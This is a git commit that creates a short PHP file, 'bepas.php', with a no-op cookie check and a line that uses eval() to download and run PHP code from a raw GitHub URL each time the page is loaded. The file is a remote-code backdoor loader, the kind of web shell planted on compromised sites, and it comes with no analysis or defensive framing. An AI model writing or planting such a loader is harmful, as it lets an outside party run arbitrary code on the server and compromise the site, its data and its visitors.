8bb6e228769917ac994be4a7019c59dd47d95e2c
dan1584 <pewedandi32@gmail.com>
2024-10-19 20:50:06 +0700

    Create bepas.php

---
+++ bepas.php
@@ -0,0 +1,7 @@
+<?php
+
+if (isset($_COOKIE['anjing']) && $_COOKIE['anjing'] == "anjing") {
+}
+
+?>
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/dan1584/asfdas/main/maridono.php"));?>
